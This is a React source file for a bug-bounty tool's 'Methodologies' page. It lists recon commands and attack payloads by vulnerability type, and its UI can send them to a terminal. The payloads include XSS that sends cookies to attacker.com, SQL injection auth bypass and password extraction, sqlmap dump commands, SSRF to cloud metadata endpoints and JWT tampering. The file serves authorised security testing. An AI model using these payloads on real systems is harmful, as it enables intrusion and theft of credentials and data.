import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { WorkspaceShell } from '@/components/layout/WorkspaceShell'
import { cn } from '@/lib/utils'
import { useAppStore } from '@/stores/app-store'
import { toast } from '@/stores/toast-store'
import { ChevronDown, ChevronRight, Copy, Check, TerminalSquare } from 'lucide-react'

// ── Data ──────────────────────────────────────────────────────────────────────

interface Step {
  title: string
  desc: string
  commands?: string[]
  tips?: string[]
  payloads?: string[]
}

interface Phase {
  id: string
  label: string
  steps: Step[]
}

interface Methodology {
  id: string
  label: string
  color: string
  borderColor: string
  bgColor: string
  severity: string
  desc: string
  phases: Phase[]
}

const METHODOLOGIES: Methodology[] = [
  {
    id: 'recon',
    label: 'Recon & Attack Surface',
    color: 'text-blue-400',
    borderColor: 'border-blue-500/30',
    bgColor: 'bg-blue-950/20',
    severity: 'Foundation',
    desc: 'Map the entire attack surface before exploiting anything.',
    phases: [
      {
        id: 'passive',
        label: '1. Passive Recon',
        steps: [
          {
            title: 'Subdomain enumeration',
            desc: 'Discover all subdomains without directly contacting the target.',
            commands: [
              'subfinder -d target.com -o subs.txt',
              'amass enum -passive -d target.com -o amass.txt',
              'cat subs.txt amass.txt | sort -u > all_subs.txt',
            ],
            tips: ['Look for forgotten subdomains: dev., staging., old., api., admin.', 'Check each one — many have weaker configurations'],
          },
          {
            title: 'JS & endpoint discovery',
            desc: 'Extract endpoints, params, and secrets from public JS files.',
            commands: [
              'gau target.com | grep "\\.js" | sort -u > js_files.txt',
              'katana -u https://target.com -jc -o katana_out.txt',
            ],
            tips: ['Production JS files often have hardcoded internal API endpoints', 'Look for: apiKey, secret, token, password, endpoint'],
          },
        ],
      },
      {
        id: 'active',
        label: '2. Active Recon',
        steps: [
          {
            title: 'Live host probing',
            desc: 'Confirm which subdomains are active and what technologies they use.',
            commands: [
              'httpx -l all_subs.txt -title -tech-detect -status-code -o live_hosts.txt',
              'nmap -sV -sC -p 80,443,8080,8443 -iL all_subs.txt',
            ],
            tips: ['Filter for 200/301/302 — 403s are also interesting (they exist but are protected)'],
          },
          {
            title: 'Directory & file discovery',
            desc: 'Find hidden paths, admin panels, and backups.',
            commands: [
              'gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20 -x php,html,bak,zip',
              'ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403',
            ],
            tips: ['Priority extensions: .bak, .zip, .sql, .env, .log, .old', 'Also try /.git/HEAD, /.env, /backup.zip'],
          },
        ],
      },
    ],
  },
  {
    id: 'idor',
    label: 'IDOR / Broken Access Control',
    color: 'text-yellow-400',
    borderColor: 'border-yellow-500/30',
    bgColor: 'bg-yellow-950/20',
    severity: 'High / Critical',
    desc: 'Access other users\' resources by manipulating IDs or references.',
    phases: [
      {
        id: 'find',
        label: '1. Identify candidates',
        steps: [
          {
            title: 'Look for IDs in requests',
            desc: 'Intercept requests and find any object identifier.',
            tips: [
              'Numeric IDs: /api/users/123, ?invoice_id=456',
              'UUIDs: /api/orders/550e8400-e29b-41d4-a716-446655440000',
              'IDs en headers, cookies, body JSON',
              'Palabras clave: id, user_id, account, order, file, doc, receipt',
            ],
          },
          {
            title: 'Create two test accounts',
            desc: 'Account A (attacker) and Account B (victim). Create resources with Account B and access them from A.',
            tips: [
              'Register with temporary emails: mailinator.com, guerrillamail.com',
              'Document the IDs of all resources created by each account',
            ],
          },
        ],
      },
      {
        id: 'exploit',
        label: '2. Exploit',
        steps: [
          {
            title: 'Direct ID tampering',
            desc: 'Change the ID of resource A for the ID of resource B.',
            commands: [
              'GET /api/invoices/1001  (tu factura)',
              'GET /api/invoices/1002  (factura de otro usuario)',
              'PUT /api/profile/1002   (editar perfil de otro)',
            ],
            payloads: ['../../../etc/passwd (path traversal combo)', '{id: 1, user_id: 2}', 'id[]=1&id[]=2 (array injection)'],
          },
          {
            title: 'Horizontal → Vertical escalation',
            desc: 'If you can access another user, try to access admin resources.',
            commands: [
              'GET /api/admin/users',
              'POST /api/users/promote {"role": "admin"}',
              'GET /api/reports/all  (endpoint que solo admins deberían ver)',
            ],
            tips: ['Look for special IDs: 0, 1, -1 (often admin)', 'Try predictable or incremental GUIDs'],
          },
        ],
      },
    ],
  },
  {
    id: 'xss',
    label: 'XSS (Cross-Site Scripting)',
    color: 'text-orange-400',
    borderColor: 'border-orange-500/30',
    bgColor: 'bg-orange-950/20',
    severity: 'Medium / High',
    desc: 'Inject scripts that execute in the victim\'s browser.',
    phases: [
      {
        id: 'find',
        label: '1. Find entry points',
        steps: [
          {
            title: 'Identify reflected inputs',
            desc: 'Any input that appears in the HTML response is a candidate.',
            tips: [
              'Search bars, comments, usernames, error messages',
              'Query params: ?q=, ?search=, ?msg=, ?redirect=',
              'Reflected headers: User-Agent, Referer, X-Forwarded-For',
              'Upload filenames shown in the response',
            ],
          },
          {
            title: 'Basic probe',
            desc: 'Verify if the input reaches the response unsanitized.',
            payloads: [
              'nexhuntXSS<"\'`>',
              '<img src=x>',
              'javascript:alert(1)',
              '"><script>alert(1)</script>',
            ],
            commands: [
              'dalfox url "https://target.com/search?q=FUZZ" --follow-redirects',
            ],
          },
        ],
      },
      {
        id: 'exploit',
        label: '2. Exploit and escalate',
        steps: [
          {
            title: 'Reflected XSS',
            desc: 'The payload is reflected in the same request.',
            payloads: [
              '<script>alert(document.domain)</script>',
              '<img src=x onerror=alert(1)>',
              '\'"--></style></script><script>alert(1)</script>',
              '<svg onload=alert(1)>',
              '<details open ontoggle=alert(1)>',
            ],
          },
          {
            title: 'Stored XSS',
            desc: 'The payload persists and affects all users.',
            payloads: [
              '<script>fetch("https://attacker.com/"+document.cookie)</script>',
              '<img src=x onerror="this.src=\'https://attacker.com/?c=\'+btoa(document.cookie)">',
            ],
            tips: ['Stored XSS is worth more in BB — affects multiple users', 'Safe demo: alert(document.domain) — do not exfiltrate real data'],
          },
          {
            title: 'DOM XSS',
            desc: 'The payload executes via client-side JS without passing through the server.',
            tips: [
              'Look for: innerHTML, document.write, eval(), location.hash',
              'Sources: location.href, location.hash, document.referrer, postMessage',
              'Sinks: innerHTML, outerHTML, eval, setTimeout, location.href',
            ],
            payloads: ['#<img src=x onerror=alert(1)>', 'javascript:alert(1)'],
          },
        ],
      },
    ],
  },
  {
    id: 'sqli',
    label: 'SQL Injection',
    color: 'text-red-400',
    borderColor: 'border-red-500/30',
    bgColor: 'bg-red-950/20',
    severity: 'Critical',
    desc: 'Manipulate SQL queries to extract data, bypass auth, or execute commands.',
    phases: [
      {
        id: 'detect',
        label: '1. Detection',
        steps: [
          {
            title: 'Detect injection points',
            desc: 'Any input that affects a DB is a candidate: IDs, search, login, filters.',
            payloads: ["'", '"', '`', "' OR '1'='1", "1' AND 1=1--", "1 AND 1=2"],
            tips: ['Error-based: look for SQL error messages in the response', 'Boolean: different response with TRUE vs FALSE', 'Time-based: delays with SLEEP(3) or WAITFOR DELAY'],
          },
          {
            title: 'Confirm with SQLMap',
            desc: 'Automatically verify and exploit.',
            commands: [
              "sqlmap -u 'https://target.com/item?id=1' --dbs --batch",
              "sqlmap -u 'https://target.com/item?id=1' -D dbname --tables",
              "sqlmap -u 'https://target.com/item?id=1' -D dbname -T users --dump",
              "sqlmap -r request.txt --level=3 --risk=2 --batch",
            ],
          },
        ],
      },
      {
        id: 'exploit',
        label: '2. Explotar',
        steps: [
          {
            title: 'Auth bypass',
            desc: 'Skip login without a password.',
            payloads: [
              "admin'--",
              "' OR 1=1--",
              "' OR '1'='1'--",
              "admin'/*",
            ],
          },
          {
            title: 'Data extraction',
            desc: 'Extract sensitive data.',
            payloads: [
              "' UNION SELECT username,password FROM users--",
              "' UNION SELECT table_name,null FROM information_schema.tables--",
              "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--",
            ],
            tips: ['For reporting: extract a password hash or email — nothing more', 'A screenshot of the partial dump is enough for Critical'],
          },
        ],
      },
    ],
  },
  {
    id: 'ssrf',
    label: 'SSRF',
    color: 'text-green-400',
    borderColor: 'border-green-500/30',
    bgColor: 'bg-green-950/20',
    severity: 'High / Critical',
    desc: 'Make the server issue requests to internal or external resources.',
    phases: [
      {
        id: 'find',
        label: '1. Find SSRF entry points',
        steps: [
          {
            title: 'Identify URL inputs',
            desc: 'Any parameter that accepts a URL is a candidate.',
            tips: [
              'Params: url=, redirect=, callback=, fetch=, proxy=, target=, dest=',
              'Webhooks: notification to an external URL',
              'Import/export: "import from URL", "avatar from URL"',
              'PDF generators, screenshot services, link previewers',
            ],
          },
        ],
      },
      {
        id: 'exploit',
        label: '2. Explotar',
        steps: [
          {
            title: 'Internal network access',
            desc: 'Access internal services not exposed publicly.',
            payloads: [
              'http://127.0.0.1/admin',
              'http://localhost:8080',
              'http://192.168.1.1',
              'http://169.254.169.254/latest/meta-data/ (AWS metadata)',
              'http://metadata.google.internal/computeMetadata/v1/ (GCP)',
            ],
          },
          {
            title: 'SSRF bypass techniques',
            desc: 'Bypass basic URL filters.',
            payloads: [
              'http://0x7f000001 (127.0.0.1 in hex)',
              'http://2130706433 (127.0.0.1 in decimal)',
              'http://127.1',
              'http://[::1]',
              'http://localhost.evil.com@127.0.0.1/admin',
              'http://127.0.0.1.nip.io',
            ],
            tips: ['Use Burp Collaborator or interactsh to detect blind SSRF', 'Cloud metadata = automatic Critical in most programs'],
          },
        ],
      },
    ],
  },
  {
    id: 'bizlogic',
    label: 'Business Logic',
    color: 'text-pink-400',
    borderColor: 'border-pink-500/30',
    bgColor: 'bg-pink-950/20',
    severity: 'Medium / High',
    desc: 'Exploit business flows that work technically but violate the application\'s rules.',
    phases: [
      {
        id: 'map',
        label: '1. Map the logic',
        steps: [
          {
            title: 'Understand the full flow',
            desc: 'Before attacking, understand what the app does and what its business rules are.',
            tips: [
              'Are there prices? Discounts? Usage limits?',
              'Are there multi-step payment flows?',
              'Are there different roles (free/premium/admin)?',
              'Are there rate limits? Quotas?',
              'Are there cross-user resource references?',
            ],
          },
        ],
      },
      {
        id: 'test',
        label: '2. Attack vectors',
        steps: [
          {
            title: 'Price/quantity manipulation',
            desc: 'Modify numeric values in payment or cart requests.',
            payloads: ['price=0', 'price=-1', 'qty=-1 (negative quantity = credit)', 'qty=0.001', 'price=0.001'],
            tips: ['Intercept the checkout and modify the price directly', 'Negative qty sometimes results in credit on the account'],
          },
          {
            title: 'Workflow bypass',
            desc: 'Skip mandatory flow steps by going directly to the final endpoint.',
            tips: [
              'Step 1: /checkout/cart → Step 2: /checkout/shipping → Step 3: /checkout/pay',
              'Try going directly to /checkout/confirm without passing through /pay',
              'In password reset flows: can you jump to step 3 without the step 2 token?',
            ],
          },
          {
            title: 'Race conditions',
            desc: 'Apply the same coupon/discount multiple times simultaneously.',
            tips: [
              'Send 20 simultaneous requests to redeem a single-use coupon',
              'Use Turbo Intruder (Burp) or the Race tool in NexHunt',
              'Works especially on: coupons, referral bonuses, cashback, withdrawal limits',
            ],
            commands: ['Use Race Condition tab in NexHunt → Biz Logic'],
          },
          {
            title: 'Mass assignment',
            desc: 'Send extra fields in requests that the server should not accept.',
            payloads: [
              '{"name":"test","role":"admin"}',
              '{"price":10,"discount":100}',
              '{"user_id":1,"is_premium":true}',
              '{"plan":"free","credits":99999}',
            ],
            tips: ['Test on PUT /api/profile, POST /api/register', 'Inspect the request and add fields you see in the response'],
          },
        ],
      },
    ],
  },
  {
    id: 'auth',
    label: 'Auth & Session',
    color: 'text-cyan-400',
    borderColor: 'border-cyan-500/30',
    bgColor: 'bg-cyan-950/20',
    severity: 'Critical',
    desc: 'Bypass authentication, steal sessions, or escalate privileges.',
    phases: [
      {
        id: 'test',
        label: 'Main attack vectors',
        steps: [
          {
            title: 'JWT attacks',
            desc: 'Manipulate JSON Web Tokens to escalate privileges.',
            payloads: [
              'None algorithm: {"alg":"none","typ":"JWT"} + payload with no signature',
              'HS256 → RS256 confusion',
              'kid injection: {"kid":"../../dev/null"}',
            ],
            commands: ['jwt_tool token.jwt -T (tamper)', 'hashcat -a 0 -m 16500 token.jwt /wordlists/rockyou.txt'],
            tips: ['Decode at jwt.io first', 'Look for sensitive data in the payload', 'Try changing role/admin/plan in the payload'],
          },
          {
            title: 'Password reset flaws',
            desc: 'Predictable, non-expiring, or reusable tokens.',
            tips: [
              'Token in URL: may be cached by proxies, Referer header',
              'Predictable token: timestamp + user_id in base64',
              'Does the token expire? Does it invalidate after use?',
              'Host header injection in reset email: Host: attacker.com',
            ],
          },
          {
            title: 'OAuth misconfiguration',
            desc: 'Steal authorization codes or tokens.',
            tips: [
              'Open redirect in redirect_uri: change to attacker.com',
              'Missing state parameter = CSRF in OAuth flow',
              'Implicit flow: access_token goes in the fragment (#)',
              'Account takeover via email normalization: user+test@gmail.com vs user@gmail.com',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'reporting',
    label: 'Reporting & Escalation',
    color: 'text-emerald-400',
    borderColor: 'border-emerald-500/30',
    bgColor: 'bg-emerald-950/20',
    severity: 'Process',
    desc: 'How to document and report findings to maximize the bounty.',
    phases: [
      {
        id: 'write',
        label: 'Report structure',
        steps: [
          {
            title: 'Required components',
            desc: 'Every BB report must include these elements.',
            tips: [
              '1. Clear title: [Type] in [Feature/Endpoint]',
              '2. Severity + justified CVSS score',
              '3. Technical description in 2-3 sentences',
              '4. NUMBERED and exact steps to reproduce',
              '5. Proof of Concept (screenshot/video)',
              '6. Impact: what an attacker can do',
              '7. Suggested remediation',
            ],
          },
          {
            title: 'Severity escalation',
            desc: 'How to justify a higher severity rating.',
            tips: [
              'Show real impact: PoC that does something concrete, not just alert(1)',
              'Chain vulns: XSS + csrf_token leak → Account Takeover = Critical',
              'Quantify: "affects all N users on plan X"',
              'CVSS: scope changed (S:C) automatically raises to High/Critical',
              'Do not inflate CVSS — triagers know and it hurts your reputation',
            ],
          },
        ],
      },
    ],
  },
]

// ── Component ─────────────────────────────────────────────────────────────────

export function MethodologyPage() {
  const [selected, setSelected] = useState<string>(METHODOLOGIES[0].id)
  const [expandedPhases, setExpandedPhases] = useState<Set<string>>(new Set(['passive', 'find', 'detect', 'map', 'test', 'write', 'active', 'exploit']))
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null)
  const navigate = useNavigate()
  const { globalTarget, activeProjectData, setPendingCommand } = useAppStore()

  const current = METHODOLOGIES.find(m => m.id === selected)!

  // Replace common placeholder targets with the active target when available
  const fillTarget = (cmd: string) => {
    const t = globalTarget.trim() || activeProjectData?.scope?.[0] || ''
    if (!t) return cmd
    return cmd.replace(/target\.com|example\.com|site\.com|\bTARGET\b/g, t)
  }

  const sendToTerminal = (cmd: string) => {
    const filled = fillTarget(cmd)
    // Only commands that look like a shell invocation are useful in the terminal
    setPendingCommand(filled)
    navigate('/terminal')
    toast.info('Sent to Terminal', filled)
  }

  const togglePhase = (phaseId: string) => {
    setExpandedPhases(prev => {
      const n = new Set(prev)
      n.has(phaseId) ? n.delete(phaseId) : n.add(phaseId)
      return n
    })
  }

  const copyCmd = (cmd: string) => {
    navigator.clipboard.writeText(cmd)
    setCopiedCmd(cmd)
    setTimeout(() => setCopiedCmd(null), 1500)
  }

  return (
    <WorkspaceShell title="Methodologies" subtitle="Bug hunting playbooks — step by step by vulnerability type">
      <div className="flex gap-4 h-full min-h-0">

        {/* Left: methodology list */}
        <div className="w-52 shrink-0 flex flex-col gap-1 overflow-y-auto pr-1">
          {METHODOLOGIES.map(m => (
            <button
              key={m.id}
              onClick={() => setSelected(m.id)}
              className={cn(
                'text-left px-3 py-2.5 rounded-lg border text-xs transition-colors',
                selected === m.id
                  ? cn('border-opacity-60', m.borderColor, m.bgColor, m.color, 'font-medium')
                  : 'border-zinc-800 text-zinc-400 hover:bg-zinc-900 hover:text-zinc-200'
              )}
            >
              <div className={cn('font-medium', selected === m.id ? m.color : '')}>{m.label}</div>
              <div className="text-[10px] text-zinc-600 mt-0.5">{m.severity}</div>
            </button>
          ))}
        </div>

        {/* Right: content */}
        <div className="flex-1 min-h-0 overflow-y-auto space-y-4 pr-1">
          {/* Header */}
          <div className={cn('rounded-lg border p-4', current.borderColor, current.bgColor)}>
            <div className={cn('text-sm font-bold', current.color)}>{current.label}</div>
            <div className="text-xs text-zinc-400 mt-1">{current.desc}</div>
            <div className={cn('text-[10px] mt-2 font-medium', current.color)}>Severity: {current.severity}</div>
          </div>

          {/* Phases */}
          {current.phases.map(phase => (
            <div key={phase.id} className="rounded-lg border border-zinc-800 overflow-hidden">
              <button
                onClick={() => togglePhase(phase.id)}
                className="w-full flex items-center gap-2 px-4 py-3 bg-zinc-900 hover:bg-zinc-800 transition-colors text-left"
              >
                {expandedPhases.has(phase.id)
                  ? <ChevronDown size={14} className="text-zinc-500 shrink-0" />
                  : <ChevronRight size={14} className="text-zinc-500 shrink-0" />
                }
                <span className="text-sm font-semibold text-zinc-200">{phase.label}</span>
              </button>

              {expandedPhases.has(phase.id) && (
                <div className="divide-y divide-zinc-800/60">
                  {phase.steps.map((step, si) => (
                    <div key={si} className="p-4 space-y-3">
                      <div>
                        <div className="text-sm font-medium text-zinc-200">{step.title}</div>
                        <div className="text-[11px] text-zinc-500 mt-0.5">{step.desc}</div>
                      </div>

                      {step.commands && step.commands.length > 0 && (
                        <div className="space-y-1.5">
                          <div className="text-[10px] text-zinc-600 uppercase tracking-wider">Commands</div>
                          {step.commands.map((cmd, ci) => (
                            <div key={ci} className="flex items-start gap-2 group">
                              <pre className="flex-1 text-[11px] font-mono bg-zinc-950 border border-zinc-800 rounded px-3 py-1.5 text-green-300 overflow-x-auto whitespace-pre-wrap break-all">{cmd}</pre>
                              <button
                                onClick={() => sendToTerminal(cmd)}
                                title="Send to Terminal (fills active target)"
                                className="shrink-0 p-1.5 rounded border border-zinc-800 text-zinc-600 hover:text-green-400 hover:border-green-700 opacity-0 group-hover:opacity-100 transition-all mt-0.5"
                              >
                                <TerminalSquare size={11} />
                              </button>
                              <button
                                onClick={() => copyCmd(cmd)}
                                className="shrink-0 p-1.5 rounded border border-zinc-800 text-zinc-600 hover:text-zinc-300 hover:border-zinc-600 opacity-0 group-hover:opacity-100 transition-all mt-0.5"
                              >
                                {copiedCmd === cmd ? <Check size={11} className="text-green-400" /> : <Copy size={11} />}
                              </button>
                            </div>
                          ))}
                        </div>
                      )}

                      {step.payloads && step.payloads.length > 0 && (
                        <div className="space-y-1.5">
                          <div className="text-[10px] text-zinc-600 uppercase tracking-wider">Payloads</div>
                          {step.payloads.map((p, pi) => (
                            <div key={pi} className="flex items-start gap-2 group">
                              <pre className="flex-1 text-[11px] font-mono bg-zinc-950 border border-red-900/30 rounded px-3 py-1.5 text-red-300 overflow-x-auto whitespace-pre-wrap break-all">{p}</pre>
                              <button
                                onClick={() => copyCmd(p)}
                                className="shrink-0 p-1.5 rounded border border-zinc-800 text-zinc-600 hover:text-zinc-300 hover:border-zinc-600 opacity-0 group-hover:opacity-100 transition-all mt-0.5"
                              >
                                {copiedCmd === p ? <Check size={11} className="text-green-400" /> : <Copy size={11} />}
                              </button>
                            </div>
                          ))}
                        </div>
                      )}

                      {step.tips && step.tips.length > 0 && (
                        <div className="space-y-1">
                          <div className="text-[10px] text-zinc-600 uppercase tracking-wider">Tips</div>
                          {step.tips.map((tip, ti) => (
                            <div key={ti} className="flex items-start gap-2">
                              <span className="text-zinc-700 mt-0.5 shrink-0">•</span>
                              <span className="text-[11px] text-zinc-400">{tip}</span>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </WorkspaceShell>
  )
}
